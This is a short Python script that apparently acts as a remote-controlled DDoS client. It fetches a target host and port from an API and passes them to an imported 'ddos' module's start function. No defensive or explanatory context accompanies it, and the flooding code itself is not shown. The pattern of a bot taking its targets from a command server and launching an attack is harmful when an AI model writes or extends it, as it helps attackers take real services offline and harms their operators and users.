import ddos
from api import API

api = API()

def main():
  data = api.get_data()

  ddos.start(_host=data["host"], _port=data["port"])

if __name__ == '__main__':
  main()